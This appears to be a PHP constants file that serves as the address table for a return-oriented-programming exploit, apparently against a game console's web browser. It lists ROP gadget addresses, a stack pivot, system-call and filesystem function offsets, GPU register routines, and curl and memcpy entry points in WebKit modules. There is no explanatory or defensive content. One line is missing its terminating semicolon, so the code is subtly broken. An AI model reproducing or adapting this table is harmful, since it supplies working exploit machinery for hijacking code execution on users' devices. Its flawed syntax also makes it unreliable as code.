<?php

$CODEBLK_ENDADR = ((0x00100000 + 0x0027F000 + 0x00063000 + 0x00009F00 + 0x00045920) + 0xfff) & ~0xfff;
$OSSCRO_HEAPADR = 0x08133000;
$WEBKITCRO_HEAPADR = 0x0840d000;
$PEERCRO_HEAPADR = 0x08319000;
$APPHEAP_PHYSADDR = 0x2b000000;
init_mapaddrs_cro();

$STACKPIVOT_ADR = 0x0027fafc;
$COND_THROWFATALERR = 0x00266880;

$ROP_POP_R0R6PC = 0x001e24d8;
$ROP_POP_R0R8PC = 0x003137b0;
$ROP_POP_R0PC = 0x0029baa8;
$ROP_POP_R1R5PC = 0x001dfad0;

$ROP_STR_R1TOR0 = 0x0022a3b4;
$ROP_LDR_R0FROMR0 = 0x001fa7b4;
$ROP_ADDR0_TO_R1 = 0x002803bc;

$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x0029c14c;

$srv_GetServiceHandle = 0x001ed7bc;

$svcGetProcessId = 0x00270040;
$svcSendSyncRequest = 0x001eddf8;
$svcControlMemory = 0x00267620;
$svcSleepThread = 0x002deca4;

$GXLOW_CMD4 = 0x002a714c;
$GSPGPU_SERVHANDLEADR = 0x003ea3d0;

$FS_MOUNTSDMC = 0x003206b4;

$IFile_Open = 0x0032a04c;
$IFile_GetSize = 0x001f4d10;
$IFile_Seek = 0x00335a14;
$IFile_Read = 0x003138d4;

$FS_DELETEFILE = 0x0032d99c;

$FSFILEIPC_CLOSE = 0x0026c01c;
$FSFILEIPC_READ = 0x0026bfc4;
$FSFILEIPC_GETSIZE = 0x0033ca00;

$POPPC = 0x001e22e4;

$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x00422c84;

$WKC_FOPEN = $OSSCRO_MAPADR+0xdf944-0x4;
$WKC_FCLOSE = $OSSCRO_MAPADR+0xdf934-0x4;
$WKC_FREAD = $OSSCRO_MAPADR+0xdf93c-0x4;
$WKC_FWRITE = $OSSCRO_MAPADR+0xdf94c-0x4;
$WKC_FSEEK = $PEERCRO_MAPADR+0x2dfb9

$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4dc078-0x4;
$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4dbbd8-0x4;
$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4dc1e8-0x4;
$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4dbbe0-0x4;

$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4db480-0x4;
$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4db460-0x4;

$ROP_snprintf = $OSSCRO_MAPADR+0xdf73c-0x4;

$GSP_FLUSHDCACHE = 0x002a2740;
$GSP_WRITEHWREGS = 0x0029cf48;

$IFile_Close = 0x001ef484;
$IFile_Write = 0x0032f1e0;

$THROW_FATALERR = 0x001f4ce0;

$ROP_LDMSTM_R5R4_R0R3 = 0x001eb7c8;

$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2900;

$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x00103d3c;

$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0002d6cd;

?>